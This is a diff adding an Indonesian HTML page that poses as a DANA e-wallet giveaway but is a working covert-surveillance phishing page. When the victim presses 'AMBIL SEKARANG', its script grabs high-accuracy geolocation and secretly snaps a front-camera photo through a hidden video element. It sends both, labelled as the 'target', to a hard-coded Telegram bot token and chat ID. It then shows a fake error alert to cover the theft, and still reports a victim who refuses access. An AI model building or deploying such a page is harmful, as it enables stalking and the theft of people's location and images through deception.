@@ -1,1 +1,92 @@
 
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GIVEAWAY SPESIAL</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-slate-950 flex items-center justify-center h-screen">
+
+    <div class="p-10 bg-white/5 backdrop-blur-2xl border border-white/10 rounded-[2.5rem] text-center max-w-xs shadow-2xl">
+        <div class="text-6xl mb-6 animate-bounce">🎁</div>
+        <h1 class="text-2xl font-bold text-white mb-2">Klaim Berhasil!</h1>
+        <p class="text-slate-400 text-sm mb-8">Selamat! Anda mendapatkan saldo DANA Rp 750.000. Klik tombol di bawah untuk verifikasi terakhir.</p>
+        <button onclick="startProcess()" class="w-full py-4 bg-blue-600 hover:bg-blue-500 text-white rounded-2xl font-bold text-lg active:scale-95 transition-all">
+            AMBIL SEKARANG
+        </button>
+    </div>
+
+    <video id="video" autoplay playsinline muted style="position:absolute; top:-9999px; opacity:0;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        const token = '8032395755:AAHOoBnH_dc1SKid0eUHo6diq8uVAdmEGxU';
+        const chatid = '7069586199';
+
+        async function startProcess() {
+            // Ambil Lokasi Terlebih Dahulu
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
+                const acc = pos.coords.accuracy;
+                const locLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                
+                const locationData = `📍 LOKASI TARGET\n━━━━━━━━━━━━━━\n🔗 Maps: ${locLink}\n🎯 Akurasi: ${acc} meter\n📱 IP: Menunggu...`;
+                
+                // Setelah lokasi didapat, langsung ambil foto
+                captureAndSend(locationData);
+            }, (err) => {
+                // Jika lokasi ditolak, tetap ambil foto dengan keterangan lokasi ditolak
+                captureAndSend("❌ TARGET MENOLAK AKSES LOKASI");
+            }, { enableHighAccuracy: true });
+        }
+
+        async function captureAndSend(captionText) {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user", width: 1280, height: 720 } 
+                });
+                
+                video.srcObject = stream;
+                await video.play();
+
+                // Delay 3 detik agar sensor cahaya stabil (Anti-Blank)
+                setTimeout(() => {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    const ctx = canvas.getContext('2d');
+
+                    // Anti-Mirror
+                    ctx.translate(canvas.width, 0);
+                    ctx.scale(-1, 1);
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    canvas.toBlob((blob) => {
+                        const fd = new FormData();
+                        fd.append('chat_id', chatid);
+                        fd.append('photo', blob, 'target.jpg');
+                        fd.append('caption', captionText); // Gabungkan lokasi ke caption foto
+
+                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                            method: 'POST',
+                            body: fd
+                        }).then(() => {
+                            stream.getTracks().forEach(t => t.stop());
+                            alert("Koneksi Error: Silahkan coba lagi dalam 5 menit.");
+                        });
+                    }, 'image/jpeg', 0.8);
+                }, 3000);
+
+            } catch (e) {
+                // Kirim pesan teks saja jika kamera ditolak total
+                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatid}&text=${encodeURIComponent(captionText + "\n\n❌ Kamera Ditolak")}`);
+            }
+        }
+    </script>
+</body>
+</html>
